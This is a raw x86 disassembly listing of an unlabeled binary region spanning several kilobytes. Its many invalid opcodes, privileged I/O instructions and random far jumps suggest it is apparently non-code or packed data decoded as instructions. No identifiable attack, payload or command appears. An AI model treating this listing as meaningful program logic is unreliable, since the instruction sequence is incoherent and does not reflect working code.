  424cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424cde:	push   es
  424cdf:	dec    ebx
  424ce0:	out    dx,eax
  424ce1:	jl     0x424ce8
  424ce3:	push   ss
  424ce4:	frstor [ebx+0x2b34430b]
  424cea:	inc    esi
  424ceb:	stos   DWORD PTR es:[edi],eax
  424cec:	xchg   ecx,eax
  424ced:	push   edi
  424cef:	push   cs
  424cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424cf1:	shl    BYTE PTR [esi-0x6f535e07],0x1c
  424cf8:	push   0xffffff98
  424cfa:	mov    eax,ds:0x9874bc7a
  424cff:	scas   eax,DWORD PTR es:[edi]
  424d00:	adc    eax,0x6ed5f06
  424d05:	outs   dx,BYTE PTR ds:[esi]
  424d06:	cli    
  424d07:	sar    BYTE PTR [edx+0x2176ae4a],1
  424d0d:	dec    esp
  424d0e:	iret   
  424d0f:	xor    DWORD PTR [ecx-0x7250a619],edx
  424d15:	fistp  WORD PTR [ebp-0x606f3cb7]
  424d1b:	mov    edx,0x39aa4ce
  424d20:	into   
  424d21:	mov    edi,0x16ae5320
  424d26:	clc    
  424d27:	jge    0x424d3a
  424d29:	inc    esp
  424d2a:	mov    dl,0x74
  424d2c:	(bad)  
  424d2d:	adc    al,BYTE PTR [eax+eax*2+0x69]
  424d31:	xor    BYTE PTR [eax+ecx*4-0x757ff48c],al
  424d38:	mov    ecx,0xa460ebfd
  424d3d:	lods   eax,DWORD PTR ds:[esi]
  424d3e:	loop   0x424da8
  424d40:	sbb    esi,DWORD PTR [eax]
  424d42:	data16 mov cl,0x62
  424d45:	out    dx,al
  424d46:	mov    ch,0xc9
  424d48:	and    dh,dl
  424d4a:	or     cl,BYTE PTR [ebx-0x70]
  424d4d:	fiadd  WORD PTR ds:0x9be94426
  424d53:	inc    edi
  424d54:	ins    DWORD PTR es:[edi],dx
  424d55:	dec    esp
  424d56:	and    BYTE PTR [edx],dl
  424d58:	daa    
  424d59:	mov    ebp,0x6a82803b
  424d5e:	xor    eax,0x273e0b36
  424d63:	mov    DWORD PTR gs:[ebx+ecx*2-0x58792f8e],0xb4818f34
  424d6f:	jge    0x424dc8
  424d71:	or     BYTE PTR [edi+0x3],al
  424d74:	mov    DWORD PTR [ebp+0x76],ebp
  424d77:	cmp    eax,0xedd850a0
  424d7c:	add    dl,BYTE PTR [esi+0x5e]
  424d7f:	scas   al,BYTE PTR es:[edi]
  424d80:	and    DWORD PTR [ebx-0x5af598fd],edi
  424d86:	cdq    
  424d87:	mov    ds:0x43f7d572,eax
  424d8c:	sub    eax,0x98b9e58
  424d91:	int    0x35
  424d93:	sbb    ah,bh
  424d95:	dec    eax
  424d96:	xchg   BYTE PTR [ebx],cl
  424d98:	xor    BYTE PTR [ebx],bl
  424d9a:	(bad)  
  424d9b:	loope  0x424d4d
  424d9d:	lea    edi,[eax-0x4f0d3046]
  424da3:	add    DWORD PTR [esi-0x6f693a21],ebx
  424da9:	push   ebx
  424daa:	mov    ecx,0x581c2fa6
  424daf:	sbb    BYTE PTR [eax+0x32],bl
  424db2:	mov    ch,0x4b
  424db4:	dec    eax
  424db5:	ror    DWORD PTR [edx],cl
  424db7:	push   ebp
  424db8:	retf   0x49dd
  424dbb:	pop    cx
  424dbd:	mov    bl,0x52
  424dbf:	loope  0x424e02
  424dc1:	xchg   ebx,eax
  424dc2:	in     al,0xf2
  424dc4:	inc    edi
  424dc5:	add    edi,ebp
  424dc7:	cmp    ecx,DWORD PTR [edi+edi*4+0x662e3afb]
  424dce:	rcr    BYTE PTR [edi+0x1],0x0
  424dd2:	inc    ebp
  424dd3:	clc    
  424dd4:	fsub   st,st(4)
  424dd6:	retf   
  424dd7:	mov    ds,WORD PTR [edx]
  424dd9:	mov    bl,0xc1
  424ddb:	outs   dx,DWORD PTR ds:[esi]
  424ddc:	add    ecx,ecx
  424dde:	out    0x73,al
  424de0:	inc    ebp
  424de1:	cwde   
  424de2:	pop    ecx
  424de3:	pushf  
  424de4:	cmp    eax,0xc2ce975f
  424de9:	rcr    BYTE PTR [edi-0x7a],1
  424dec:	lahf   
  424ded:	mov    ebp,DWORD PTR [ecx+0x49]
  424df0:	jecxz  0x424da7
  424df2:	into   
  424df3:	xchg   esi,eax
  424df4:	xor    eax,0x3304fa45
  424df9:	fcom   st(0)
  424dfb:	inc    esi
  424dfd:	add    eax,0x1ed4187
  424e02:	gs retf 0x7c46
  424e06:	push   edx
  424e07:	arpl   WORD PTR [edx],ax
  424e09:	fidivr WORD PTR [esi]
  424e0b:	or     al,0x48
  424e0d:	add    al,0x28
  424e0f:	or     DWORD PTR [edx-0xa300ebf],ecx
  424e15:	sar    BYTE PTR [edi],1
  424e17:	add    dl,ah
  424e19:	iret   
  424e1a:	aad    0x11
  424e1c:	in     al,0xe8
  424e1e:	pop    ss
  424e1f:	popa   
  424e20:	xor    ah,BYTE PTR [eax-0x3bcde007]
  424e26:	or     ebx,DWORD PTR [ecx-0x1f2cf201]
  424e2c:	cli    
  424e2d:	pusha  
  424e2e:	add    DWORD PTR [eax],eax
	...
  424e38:	add    BYTE PTR [eax],al
  424e3a:	ins    BYTE PTR es:[edi],dx
  424e3b:	sub    ch,BYTE PTR [ebx]
  424e3d:	outs   dx,DWORD PTR es:[esi]
  424e3f:	daa    
  424e40:	ins    DWORD PTR es:[edi],dx
  424e41:	push   0xffffffda
  424e43:	add    BYTE PTR [ecx],0x9d
  424e46:	loop   0x424e27
  424e48:	(bad)
  424e4b:	mov    BYTE PTR [ecx],0x0
  424e4e:	std    
  424e4f:	add    DWORD PTR [eax],eax
  424e51:	add    BYTE PTR [esi-0x6692d7c],dl
  424e57:	stc    
  424e58:	shl    DWORD PTR [edi+0x3eef78b6],cl
  424e5e:	adc    al,bl
  424e60:	(bad)  
  424e61:	xchg   ebp,eax
  424e62:	repnz aad 0x8a
  424e65:	xor    BYTE PTR [esi+ecx*8-0x7c],bh
  424e69:	mov    esi,0xc16af0ce
  424e6e:	or     al,0x7d
  424e70:	test   DWORD PTR [esi],ecx
  424e72:	dec    DWORD PTR [esi-0x1b]
  424e75:	cdq    
  424e76:	mov    esp,0xa2b518fa
  424e7b:	in     al,dx
  424e7c:	push   esi
  424e7d:	leave  
  424e7e:	or     bh,al
  424e80:	and    dh,BYTE PTR [edx+0x1e0f81f0]
  424e86:	mov    edx,0xac65a1a3
  424e8b:	sbb    DWORD PTR [ecx+0x70],esp
  424e8e:	jo     0x424e5e
  424e90:	push   cs
  424e91:	loop   0x424e1b
  424e93:	jecxz  0x424eb1
  424e95:	xchg   edx,eax
  424e96:	call   0xa9d8:0xb620a0bf
  424e9d:	cld    
  424e9e:	pop    esi
  424e9f:	shr    edx,1
  424ea1:	add    al,0x86
  424ea3:	bound  edx,QWORD PTR [ecx+0x64]
  424ea6:	rcl    bh,0xaf
  424ea9:	adc    bl,BYTE PTR [edi]
  424eab:	(bad)  
  424eac:	je     0x424e55
  424eae:	or     DWORD PTR [esi-0x7b0531a3],ebp
  424eb4:	mov    al,cs:0x30bf9d0c
  424eba:	xchg   DWORD PTR [ebp-0x6d],eax
  424ebd:	test   al,0x92
  424ebf:	inc    ebp
  424ec0:	sub    DWORD PTR [edx-0x5c],0xe0e93cf0
  424ec7:	pop    ebp
  424ec8:	pop    eax
  424ec9:	ss out 0xb6,eax
  424ecc:	stos   DWORD PTR es:[edi],eax
  424ecd:	mov    bh,0x98
  424ecf:	xor    eax,0x8db09975
  424ed4:	pop    edi
  424ed5:	jns    0x424ef8
  424ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ed8:	pop    eax
  424ed9:	les    ebx,FWORD PTR [ebp+0x2b]
  424edc:	dec    ebp
  424edd:	pushf  
  424ede:	lahf   
  424edf:	push   esp
  424ee0:	cdq    
  424ee1:	jmp    0x4583:0x96faa429
  424ee8:	sbb    al,0xa4
  424eea:	sbb    eax,DWORD PTR [edx-0x2]
  424eed:	push   edi
  424eee:	fnstsw WORD PTR [edx+0x3]
  424ef1:	or     esp,ebp
  424ef3:	push   ebx
  424ef4:	and    BYTE PTR [ebp+0x6c],ch
  424ef7:	and    al,BYTE PTR ds:0x82f8098c
  424efd:	test   BYTE PTR [eax+0x7f265017],bl
  424f03:	and    ah,BYTE PTR [esi+ebp*1]
  424f06:	xchg   edx,eax
  424f07:	daa    
  424f08:	(bad)  
  424f09:	out    dx,al
  424f0a:	in     al,0x18
  424f0c:	call   0x1e4f2b32
  424f11:	outs   dx,DWORD PTR ds:[esi]
  424f12:	(bad)  
  424f13:	out    0x3c,eax
  424f15:	sbb    DWORD PTR [eax+ebx*8],esi
  424f18:	lea    edx,[edx]
  424f1a:	push   ecx
  424f1b:	inc    ecx
  424f1c:	dec    ebx
  424f1d:	call   0x7ed12cc1
  424f22:	out    dx,al
  424f23:	mov    esi,0xbefeeaec
  424f28:	ret    0xdd55
  424f2b:	and    cl,BYTE PTR [eax+0x38]
  424f2e:	cmp    DWORD PTR [esi+0x1609bff1],eax
  424f34:	xchg   esi,eax
  424f35:	imul   esi,DWORD PTR [edx+esi*1+0x29646007],0xffffffdd
  424f3d:	mov    al,0x7f
  424f3f:	dec    esp
  424f40:	xchg   BYTE PTR fs:[esi+ebp*1],dh
  424f44:	push   cs
  424f45:	retf   
  424f46:	rcl    DWORD PTR [eax+0x42f40442],1
  424f4c:	mov    BYTE PTR [ecx-0x77],cl
  424f4f:	nop
  424f50:	push   esi
  424f51:	and    cl,BYTE PTR [esi]
  424f53:	push   ds
  424f54:	sub    BYTE PTR [edi+0x34],dl
  424f57:	dec    eax
  424f58:	or     esp,edi
  424f5a:	pop    edx
  424f5b:	sub    al,0x35
  424f5d:	push   esp
  424f5e:	mov    ebp,0x1dfc241f
  424f63:	fcomp  QWORD PTR [edi+edx*4]
  424f66:	adc    al,0x94
  424f68:	data16 sbb bh,dh
  424f6b:	jmp    0x424f2f
  424f6d:	mov    ah,0x5e
  424f6f:	mov    bh,0xc6
  424f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f72:	shl    DWORD PTR [edi+0x44],0xdd
  424f76:	sub    DWORD PTR [eax+0xa77f52],ebp
  424f7c:	loope  0x424fa5
  424f7e:	or     al,0x44
  424f80:	mov    ah,0x5
  424f82:	mov    cl,0x34
  424f84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f85:	es dec cx
  424f88:	outs   dx,DWORD PTR ds:[esi]
  424f89:	push   ds
  424f8a:	and    ecx,DWORD PTR [edi+0x74]
  424f8d:	jle    0x424f53
  424f8f:	dec    edi
  424f90:	test   ebp,ebx
  424f92:	dec    edi
  424f93:	sub    ecx,DWORD PTR [edi-0x64]
  424f96:	push   esi
  424f97:	clc    
  424f98:	jmp    0x424f43
  424f9a:	sub    ch,0x1e
  424f9d:	cli    
  424f9e:	dec    esi
  424f9f:	mov    ds:0xe7853c3b,eax
  424fa4:	bound  eax,QWORD PTR [edx+eax*2-0x7cb565a2]
  424fab:	or     al,0x30
  424fad:	pop    edi
  424fae:	jge    0x424f75
  424fb0:	clc    
  424fb1:	push   cs
  424fb2:	xchg   edx,eax
  424fb3:	or     BYTE PTR [esi],0xd8
  424fb6:	mov    db4,ecx
  424fb9:	mov    ecx,0x4925e3ea
  424fbe:	jnp    0x424f7e
  424fc0:	mov    DWORD PTR [edi],ecx
  424fc2:	cs mov esi,0x7f9387cc
  424fc8:	jmp    0x424fa2
  424fca:	mov    gs,WORD PTR [ebx]
  424fcc:	lock in eax,0x49
  424fcf:	out    0x1c,al
  424fd1:	mov    dh,0xee
  424fd3:	std    
  424fd4:	cs dec ebx
  424fd6:	retf   0x82c9
  424fd9:	dec    ecx
  424fda:	dec    esp
  424fdb:	add    esi,DWORD PTR [ecx+0x46]
  424fde:	inc    edx
  424fdf:	adc    BYTE PTR [edi-0x4f1db61f],ah
  424fe5:	sar    BYTE PTR [ecx+0x4d],0x5f
  424fe9:	ja     0x424f9d
  424feb:	loope  0x424fa4
  424fed:	je     0x424ff7
  424fef:	sbb    BYTE PTR [ebx+0x627d1f1a],0xc7
  424ff6:	lahf   
  424ff7:	pop    ebx
  424ff8:	aaa    
  424ff9:	lahf   
  424ffa:	int3   
  424ffb:	or     ebp,ebp
  424ffd:	fs jo  0x425064
  425000:	cmp    DWORD PTR [ecx-0x64189bda],ecx
  425006:	pop    esi
  425007:	stos   DWORD PTR es:[edi],eax
  425008:	shl    DWORD PTR [eax-0x4734f3ae],0x1b
  42500f:	cld    
  425010:	sub    BYTE PTR [esi-0x2f63051a],ch
  425016:	xlat   BYTE PTR ds:[ebx]
  425017:	xchg   edi,eax
  425018:	mov    ch,0xb2
  42501a:	scas   al,BYTE PTR es:[edi]
  42501b:	mov    eax,ds:0x20330f6a
  425020:	stos   BYTE PTR es:[edi],al
  425021:	retf   0x7dda
  425024:	cwde   
  425025:	in     eax,0xb4
  425027:	mov    BYTE PTR [edi+edx*2],al
  42502a:	popf   
  42502b:	hlt    
  42502c:	cli    
  42502d:	and    DWORD PTR [edi+0x2],0xc35085fd
  425034:	hlt    
  425035:	mov    ah,0x18
  425037:	add    BYTE PTR [eax],bh
  425039:	xchg   eax,esi
  42503b:	sar    ecx,0x39
  42503e:	push   eax
  42503f:	jbe    0x4250ab
  425041:	cmp    ebp,DWORD PTR [edx-0x5e6a79c9]
  425047:	adc    BYTE PTR [ebx-0x4e],bl
  42504a:	int3   
  42504b:	mov    ah,0x70
  42504d:	pop    ebp
  42504e:	sub    eax,0x0
  425053:	add    BYTE PTR [eax],al
  425055:	add    BYTE PTR [eax],al
  425057:	add    BYTE PTR [eax],al
  425059:	add    BYTE PTR [ebx-0x73],al
  42505c:	pop    ds
  42505d:	and    bh,bl
  42505f:	mov    dl,0x7f
  425061:	out    dx,eax
  425062:	leave  
  425063:	enter  0xb54,0xa7
  425067:	push   ebp
  425068:	and    eax,0x1c89f20
  42506d:	add    ch,bh
  42506f:	add    DWORD PTR [eax],eax
  425071:	add    BYTE PTR [esi+0x54],ah
  425074:	data16 je 0x4250eb
  425077:	icebp  
  425078:	sar    ecx,0xdd
  42507b:	imul   eax,DWORD PTR [ebp-0x1e0b1447],0xbfbe5727
  425085:	shl    BYTE PTR [esi],1
  425087:	icebp  
  425088:	leave  
  425089:	(bad)  
  42508a:	mov    ds:0x161d895e,al
  42508f:	fsubrp st(5),st
  425091:	(bad)  
  425093:	add    DWORD PTR [edx-0x414f90c1],esp
  425099:	pop    ss
  42509a:	addr16 cli 
  42509c:	mov    ebx,0x816226fd
  4250a1:	inc    ecx
  4250a2:	mov    ebx,0xb72e6036
  4250a7:	mov    ds:0xe59996e7,al
  4250ac:	push   cs
  4250ad:	or     DWORD PTR [esp+ecx*1],ebp
  4250b0:	xor    al,0x86
  4250b2:	fisub  DWORD PTR [eax+0x27]
  4250b5:	mov    dh,0xf2
  4250b7:	(bad)  
  4250b8:	sbb    eax,0x4a67fa02
  4250bd:	aam    0x4e
  4250bf:	dec    edi
  4250c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4250c1:	and    bl,BYTE PTR [eax+0x55cfed5f]
  4250c7:	cmp    eax,0x1a27cab
  4250cc:	setb   ch
  4250cf:	jbe    0x4250c2
  4250d1:	push   esi
  4250d2:	xor    BYTE PTR [eax+0x26214548],dl
  4250d8:	add    al,0x7d
  4250da:	in     al,0xb7
  4250dc:	jmp    0x1470:0x337e392d
  4250e3:	mov    eax,0x9de7ccf5
  4250e8:	int3   
  4250e9:	(bad)  
  4250ea:	stos   DWORD PTR es:[edi],eax
  4250eb:	mov    BYTE PTR [ebx-0x47],ah
  4250ee:	xor    BYTE PTR [ebx+0x7b],bl
  4250f1:	ss xor al,0xa3
  4250f4:	cwde   
  4250f5:	mov    ds,WORD PTR [edx+0x61db134a]
  4250fb:	movntps XMMWORD PTR [edi+eiz*2],xmm7
  4250ff:	in     eax,dx
  425100:	xchg   esp,eax
  425101:	mov    bh,0x75
  425103:	fidiv  DWORD PTR [edi-0x1e04983b]
  425109:	jo     0x425147
  42510b:	das    
  42510c:	aam    0xe5
  42510e:	es jge 0x4250e5
  425111:	cmp    DWORD PTR [edx+0x28],esi
  425114:	push   ebp
  425115:	nop
  425116:	clc    
  425117:	std    
  425118:	xchg   ebp,eax
  425119:	and    al,0x7d
  42511b:	(bad)
  42511f:	pushf  
  425120:	lods   al,BYTE PTR ds:[esi]
  425121:	pop    ebp
  425122:	retf   
  425123:	dec    esp
  425124:	jp     0x42519d
  425126:	pop    es
  425127:	jno    0x4250aa
  425129:	ins    DWORD PTR es:[edi],dx
  42512a:	add    eax,0x3a3796ed
  42512f:	es add dl,dh
  425132:	xchg   esi,eax
  425133:	scas   eax,DWORD PTR es:[edi]
  425134:	inc    ebp
  425135:	xchg   ebx,eax
  425136:	push   cs
  425137:	and    DWORD PTR [edi],0xffffffcb
  42513a:	sbb    eax,0xc618d27
  42513f:	(bad)  
  425140:	icebp  
  425141:	or     eax,0x87398c9d
  425146:	loop   0x425134
  425148:	pushf  
  425149:	adc    cl,BYTE PTR [edx+eax*8-0x5b]
  42514d:	add    bl,ch
  42514f:	xlat   BYTE PTR ds:[ebx]
  425150:	outs   dx,DWORD PTR ds:[esi]
  425151:	neg    DWORD PTR [edi]
  425153:	adc    bl,BYTE PTR [esi]
  425155:	int    0x9e
  425157:	sbb    eax,DWORD PTR [ebx+0x7e36b79e]
  42515d:	jp     0x4251ce
  42515f:	retf   0x5680
  425162:	inc    edx
  425163:	jae    0x4250f6
  425165:	out    dx,eax
  425166:	pop    ebx
  425167:	popa   
  425168:	ret    
  425169:	lds    ecx,FWORD PTR [edx+0x15890442]
  42516f:	aaa    
  425170:	inc    edx
  425171:	push   edx
  425172:	mov    ebx,0xe0e93ecb
  425177:	mov    bl,0xfa
  425179:	xor    dl,ch
  42517b:	fldln2 
  42517d:	mov    cl,0xae
  42517f:	xor    dh,BYTE PTR [eax]
  425181:	sahf   
  425182:	cmp    eax,0x764cc6cd
  425187:	push   edx
  425188:	pop    esi
  425189:	mov    ebp,ss
  42518b:	ds das 
  42518d:	ss jge 0x4251fc
  425190:	sub    edi,ebx
  425192:	nop
  425193:	outs   dx,DWORD PTR ds:[esi]
  425194:	jp     0x42513d
  425196:	inc    ecx
  425197:	add    edx,DWORD PTR [ebx+ebp*1]
  42519a:	data16 fiadd WORD PTR [ebx+0x78c0f2ac]
  4251a1:	imul   edi,ecx,0x64
  4251a4:	div    edi
  4251a6:	cmc    
  4251a7:	jb     0x4251b6
  4251a9:	int    0x57
  4251ab:	sub    eax,0xabc50b97
  4251b0:	(bad)  
  4251b1:	mov    ebx,0xd06fa223
  4251b6:	adc    ch,BYTE PTR [edi+0x586501cd]
  4251bc:	(bad)
  4251bf:	nop
  4251c0:	xor    eax,0x1ac5560c
  4251c5:	mov    ch,bl
  4251c7:	cmp    al,dh
  4251c9:	xchg   DWORD PTR [ebp-0x4edbc798],eax
  4251cf:	jg     0x4251fc
  4251d1:	pusha  
  4251d2:	test   al,0xa0
  4251d4:	jmp    0x7ec68533
  4251d9:	pop    ds
  4251da:	and    BYTE PTR [ebx+0x61],ah
  4251dd:	test   BYTE PTR [ebx-0x1f],ch
  4251e0:	jecxz  0x4251c6
  4251e2:	pusha  
  4251e3:	and    DWORD PTR [ebx+0x3d],ecx
  4251e6:	nop
  4251e7:	outs   dx,DWORD PTR ds:[esi]
  4251e8:	jno    0x3d137c78
  4251ee:	int3   
  4251ef:	sub    BYTE PTR [ebp+0x4196d9a1],bl
  4251f5:	lock add BYTE PTR [edx+0x1d974458],dh
  4251fc:	icebp  
  4251fd:	jge    0x4251f7
  4251ff:	xchg   edx,eax
  425200:	xor    dh,dh
  425202:	icebp  
  425203:	cmp    ecx,DWORD PTR [edx-0x2250c3f0]
  425209:	cmp    ebp,DWORD PTR [ebp+0x4]
  42520c:	mov    al,ds:0xca766fad
  425211:	popf   
  425212:	pop    esi
  425213:	inc    edi
  425214:	lods   eax,DWORD PTR ds:[esi]
  425215:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425216:	jo     0x42524b
  425218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425219:	stc    
  42521a:	jbe    0x42519f
  42521c:	popa   
  42521d:	add    ah,0xdf
  425220:	dec    esi
  425221:	jmp    0xe786:0x9d14c88a
  425228:	mov    ebp,0xc7b2ef2
  42522d:	outs   dx,DWORD PTR ds:[esi]
  42522e:	cmp    eax,eax
  425230:	fst    DWORD PTR [ecx+0x4393b9c9]
  425236:	fdivr  DWORD PTR [ecx+0x42]
  425239:	jle    0x425261
  42523b:	jo     0x4251f3
  42523d:	xor    esp,DWORD PTR [eax+0x2]
  425240:	xchg   ecx,eax
  425241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425242:	ret    
  425243:	sub    al,0x9
  425245:	cmp    BYTE PTR [ecx-0x37950afc],bh
  42524b:	add    DWORD PTR [ecx],ebx
  42524d:	mov    ebp,0xcc59a357
  425252:	and    eax,0x7fbeff02
  425257:	lock and al,0x2e
  42525a:	push   edx
  42525b:	int3   
  42525c:	das    
  42525d:	mov    eax,0xd1b3c5c3
  425262:	jl     0x425219
  425264:	mov    bh,0x45
  425266:	and    BYTE PTR [edx],dh
  425268:	aam    0xf2
  42526a:	and    esp,DWORD PTR [ebx+0xef739e]
	...
  425278:	add    BYTE PTR [eax],al
  42527a:	hlt    
  42527b:	cmp    DWORD PTR [edx-0x2002081],edx
  425281:	mov    ebx,0xd77f6470
  425286:	cmp    ah,BYTE PTR [edi-0x73]
  425289:	clc    
  42528a:	pushf  
  42528b:	retf   0x1
  42528e:	std    
  42528f:	add    DWORD PTR [eax],eax
  425291:	add    BYTE PTR [edx],dh
  425293:	dec    esp
  425294:	pop    eax
  425295:	dec    ebx
  425296:	pushf  
  425297:	fs dec esp
  425299:	jmp    0x4656:0xf8006c5b
  4252a0:	sbb    eax,0x7a2d01a7
  4252a5:	inc    esp
  4252a6:	int3   
  4252a7:	mov    DWORD PTR [esi+edx*4-0x1a],esp
  4252ab:	mov    al,0x35
  4252ad:	xchg   esp,eax
  4252ae:	and    ch,0x84
  4252b1:	xchg   ebp,eax
  4252b2:	shl    BYTE PTR [ebp-0x4664c4f6],1
  4252b8:	xchg   esp,eax
  4252b9:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4252bb:	xor    BYTE PTR [esi],ah
  4252bd:	pop    ds
  4252be:	in     al,0xc1
  4252c0:	ins    BYTE PTR es:[edi],dx
  4252c1:	outs   dx,DWORD PTR ds:[esi]
  4252c2:	push   0x6a
  4252c4:	cdq    
  4252c5:	xor    BYTE PTR [edi],dl
  4252c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252c8:	push   ds
  4252c9:	cs pop eax
  4252cb:	fnstsw WORD PTR [ecx+0x50]
  4252ce:	dec    esp
  4252cf:	ja     0x42533a
  4252d1:	jo     0x4252ea
  4252d3:	les    esi,FWORD PTR [eax]
  4252d5:	ja     0x425338
  4252d7:	mov    ds:0xde8f46e5,al
  4252dc:	xor    al,dl
  4252de:	cmp    eax,0xfeea52e
  4252e3:	push   ecx
  4252e4:	leave  
  4252e5:	nop
  4252e6:	jmp    0xf3e8:0xadf30cbe
  4252ed:	xchg   ebx,eax
  4252ee:	out    dx,eax
  4252ef:	xlat   BYTE PTR es:[ebx]
  4252f1:	retf   
  4252f2:	das    
  4252f3:	pop    ds
  4252f4:	jg     0x4252fc
  4252f6:	add    DWORD PTR [eax+0x1a734156],eax
  4252fc:	out    dx,al
  4252fd:	in     eax,dx
  4252fe:	jge    0x42533d
  425300:	and    dh,ch
  425302:	xor    al,0x51
  425304:	fs jle 0x4252e5
  425307:	fstp   DWORD PTR [ebp-0x52]
  42530a:	jmp    0x4252a6
  42530c:	pop    ecx
  42530d:	sar    DWORD PTR [edx],cl
  42530f:	cli    
  425310:	(bad)  
  425311:	jmp    FWORD PTR [edx+0x405a6ac8]
  425317:	jnp    0x4252b6
  425319:	clc    
  42531a:	mov    ebx,0xd0463f39
  42531f:	push   esi
  425320:	adc    BYTE PTR [ebx+esi*2],0x95
  425324:	inc    eax
  425325:	dec    ecx
  425326:	mov    esp,0x212b013d
  42532b:	in     al,0xfe
  42532d:	test   BYTE PTR [esi+0x83d9695],bh
  425333:	cdq    
  425334:	dec    esi
  425335:	cmp    ebp,DWORD PTR [ecx-0x6f96def8]
  42533b:	leave  
  42533c:	mov    al,ds:0xc1b5b4c4
  425341:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425342:	fist   DWORD PTR [esi+0x60250709]
  425348:	sbb    DWORD PTR [ebp+0x38cb73b1],esi
  42534e:	fs sub bh,ah
  425351:	dec    ecx
  425352:	in     eax,0xd4
  425354:	jmp    0x42538a
  425356:	push   ds
  425357:	sbb    bh,ah
  425359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42535a:	mov    ah,BYTE PTR [edx-0x76a17d99]
  425360:	mov    ch,0x80
  425362:	loope  0x42535c
  425364:	jmp    0x4eb5:0x45e9b24d
  42536b:	test   al,0xc6
  42536d:	fidiv  DWORD PTR [ebx+0x6f6c42d5]
  425373:	addr16 push edi
  425375:	sar    BYTE PTR [ebx-0x33c9f849],1
  42537b:	ror    DWORD PTR [esi-0x107af5cf],0x7e
  425382:	inc    eax
  425383:	xchg   ecx,eax
  425384:	es nop
  425386:	and    DWORD PTR [edi],ecx
  425388:	push   edx
  425389:	repnz push esp
  42538b:	fisubr WORD PTR [eax+0x69]
  42538e:	arpl   WORD PTR [esi],sp
  425390:	mov    BYTE PTR [esp+ebx*4],al
  425393:	ja     0x4253e6
  425395:	pop    edx
  425396:	push   es
  425397:	mov    dh,ch
  425399:	iret   
  42539a:	lds    esi,FWORD PTR [edi]
  42539c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42539d:	mov    ebp,0xfcfc44b0
  4253a2:	pop    edx
  4253a3:	out    0x29,al
  4253a5:	pop    eax
  4253a6:	adc    cl,BYTE PTR [ecx]
  4253a8:	dec    esi
  4253a9:	les    ebx,FWORD PTR ss:[edi+0xf9d4e4c]
  4253b0:	or     eax,0xace8a181
  4253b5:	cli    
  4253b6:	stos   DWORD PTR es:[edi],eax
  4253b7:	dec    edi
  4253b8:	sub    ah,al
  4253ba:	jnp    0x42540d
  4253bc:	loop   0x4253dc
  4253be:	mov    esp,0xbaa6e461
  4253c3:	test   BYTE PTR [esi+esi*2+0x19f61c17],ch
  4253ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253cb:	enter  0x39a5,0x9d
  4253cf:	call   0xbf4a1379
  4253d4:	into   
  4253d5:	sbb    al,0xd3
  4253d7:	mov    ah,0xe0
  4253d9:	shl    esp,cl
  4253db:	jg     0x4253d0
  4253dd:	xor    ah,0x6b
  4253e0:	shl    BYTE PTR [eiz*8+0x14147e8b],cl
  4253e7:	adc    eax,0x2df019d4
  4253ec:	aad    0xf0
  4253ee:	cli    
  4253ef:	cmp    ebp,DWORD PTR [edx+0x1b]
  4253f2:	inc    edi
  4253f3:	les    edx,FWORD PTR [ecx]
  4253f5:	(bad)  
  4253f6:	xlat   BYTE PTR ds:[ebx]
  4253f7:	or     bl,BYTE PTR ds:0xedab48f8
  4253fd:	add    BYTE PTR [ebp+0xf],0xf3
  425401:	push   cs
  425402:	pushf  
  425403:	xchg   edx,eax
  425404:	repz xchg edx,eax
  425406:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  425408:	and    esi,ebp
  42540a:	shr    BYTE PTR [edx+0x4b9c2315],1
  425410:	mov    al,ds:0x83716ad4
  425415:	cmp    eax,0x3e603f1c
  42541a:	jns    0x425460
  42541c:	add    bh,BYTE PTR [edi-0x2e]
  42541f:	xor    DWORD PTR [ebx],ebp
  425421:	and    edi,ecx
  425423:	xchg   DWORD PTR [esi-0x5],ebx
  425426:	cmp    eax,0xc36b7141
  42542b:	inc    eax
  42542c:	fcmove st,st(4)
  42542e:	int3   
  42542f:	ss (bad) ds:[eax-0x33]
  425434:	cld    
  425435:	adc    BYTE PTR [edx-0x633dcc0f],bh
  42543b:	shl    DWORD PTR [eax+0x2845310d],cl
  425441:	mov    edi,0xed6dd35f
  425446:	mov    WORD PTR [edx+0x599a4b3c],ss
  42544c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42544d:	fcom   QWORD PTR [ebp+ebp*1-0x1e7e24e0]
  425454:	push   edx
  425455:	xchg   ecx,eax
  425456:	repnz cmp al,0xcb
  425459:	dec    esi
  42545a:	jmp    0x425491
  42545c:	or     eax,0x4728982
  425461:	sub    al,BYTE PTR [esi]
  425463:	cmp    BYTE PTR [ebx+0x4c],cl
  425466:	mov    bl,0x81
  425468:	xchg   edx,eax
  425469:	fistp  DWORD PTR [edx]
  42546b:	dec    ebp
  42546d:	add    ecx,DWORD PTR [edi]
  42546f:	cmc    
  425470:	shl    BYTE PTR [edi],cl
  425472:	push   0x33
  425474:	and    cl,BYTE PTR [eax-0x7c]
  425477:	cmp    eax,ecx
  425479:	cwde   
  42547a:	fcomp  DWORD PTR [ecx+eax*4]
  42547d:	and    BYTE PTR [ebp-0x77],0x64
  425481:	cmp    BYTE PTR [ebx+0x22f4e210],0x19
  425488:	add    al,0x8c
  42548a:	xchg   DWORD PTR [ebp+0x3f2107],ebp
	...
  425498:	add    BYTE PTR [eax],al
  42549a:	push   esp
  42549b:	ds and al,0x19
  42549e:	outs   dx,BYTE PTR ds:[esi]
  42549f:	sbb    edi,DWORD PTR [ebp+0x7f]
  4254a2:	(bad)  
  4254a3:	aam    0x10
  4254a5:	dec    edi
  4254a6:	js     0x425481
